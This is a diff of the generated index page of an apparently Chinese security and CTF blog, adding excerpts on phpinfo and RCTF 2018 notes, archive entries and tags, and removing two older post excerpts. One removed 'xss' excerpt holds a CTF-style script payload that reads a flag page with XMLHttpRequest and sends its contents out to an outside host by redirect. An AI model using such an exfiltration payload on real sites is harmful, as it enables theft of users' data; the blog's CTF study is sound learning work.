@@ -354,6 +354,72 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href="/posts/23527/">
+            
+                <span>phpinfo解读</span>
+        </a>
+        <div class="abstract-content">
+            phpinfo解读我们以 链接：phpinfo() 为例来讲解吧。
+版本更迭phpinfo里最显眼的信息，也就是其标题（图1），其中包含PHP的版本信息。 PHP 5.6 是官方最后一个支持的PHP 5版本，不过，这个版本也已经于2017年1月19号停止功能性更新，只提供安全更新。到2018年12月31号为止，PHP 5.6也将完全终止更新，PHP5彻底退出历史舞台。
+ PHP7里提供了很多更好用的语法、函数，也极大改进了安全性。举几个简单的例子：
+
+移除不支持SQL预编译的Mysql扩展：mysql 
+移除preg_replace中容易导致代码执行漏洞的正则模式：e 
+assert从一...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/05/22</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/posts/9764/">
+            
+                <span>rctf2018学习笔记</span>
+        </a>
+        <div class="abstract-content">
+            Web赛后总结
+r-cursive源代码:
+1234567891011121314151617&lt;?php$token = sha1($_SERVER[&apos;REMOTE_ADDR&apos;]);$dir = &apos;../sandbox/&apos;.$token.&apos;/&apos;;is_dir($dir) ?: mkdir($dir);is_file($dir.&apos;index.php&apos;) ?: file_put_contents($dir.&apos;index.php&apos;, str_replace(&apos;#SHA1#&apo...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/05/22</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href="/posts/32791/">
             
                 <span>bypassaslr_1</span>
@@ -625,65 +691,6 @@ d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0...
             <div class="abstract-tags">
     
         <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/52452/">
-            
-                <span>xss</span>
-        </a>
-        <div class="abstract-content">
-            link 标签引入外部 js。
-12也可以用域名，将 . 用 。 代替。&lt;link rel=import href=\\八进制ip
-1234567&lt;script&gt;  var xhr = new XMLHttpRequest();  xhr.open("GET", "https://router.vip/flag.php", false);  xhr.send();  a=xhr.responseText;  location.href='https://master.xbfzss.cn/?a='+escape(a);&lt;/script&gt;
-xss:jquery版...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/27</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/posts/24854/">
-            
-                <span>url相对路径和绝对路径</span>
-        </a>
-        <div class="abstract-content">
-            jquery.min.js的绝对路径:
-1http://39.107.33.96:20000/static/js/jquery.min.js
-当前url: http://39.107.33.96:20000/index.php/view/
-html中引入jquery.min.js,相对路径:1&lt;script src=&quot;../static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
-此时: 浏览器解析js的路径:1http://39.107.33.96:20000/index.php/static/js/jquery.min.js  ...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/03/27</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="前端">前端</a>
     
 </div>
             
@@ -1620,9 +1627,59 @@ html中引入jquery.min.js,相对路径:1&lt;script src=&quot;../static/js/jquer
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 52
+        Total : 54
         </div>
         <!-- search  -->
         
@@ -1635,6 +1692,11 @@ html中引入jquery.min.js,相对路径:1&lt;script src=&quot;../static/js/jquer
     
     <div class="archive-year"> 2018 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/posts/11284/">jvm-java虚拟机如何运行java字节码</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1664,6 +1726,11 @@ html中引入jquery.min.js,相对路径:1&lt;script src=&quot;../static/js/jquer
     
         <li class="archive-post-item">
             <span class="archive-post-date">09/20</span><a class="archive-post-title" href="/posts/11234/">dubbo-启动</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/18</span><a class="archive-post-title" href="/posts/26893/">渗透测试-vulnhub-acid</a>
         </li>
     
     
@@ -1698,12 +1765,12 @@ html中引入jquery.min.js,相对路径:1&lt;script src=&quot;../static/js/jquer
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
         </li>
     
     
@@ -1813,12 +1880,12 @@ html中引入jquery.min.js,相对路径:1&lt;script src=&quot;../static/js/jquer
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
         </li>
     
     
@@ -1901,15 +1968,17 @@ html中引入jquery.min.js,相对路径:1&lt;script src=&quot;../static/js/jquer
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
-    
         <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
         <span class="sidebar-tag-name" data-tags="dubbo"><span class="iconfont-archer">&#xe606;</span>dubbo</span>
     
         <span class="sidebar-tag-name" data-tags="工具手册"><span class="iconfont-archer">&#xe606;</span>工具手册</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
@@ -1924,6 +1993,8 @@ html中引入jquery.min.js,相对路径:1&lt;script src=&quot;../static/js/jquer
         <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
         <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
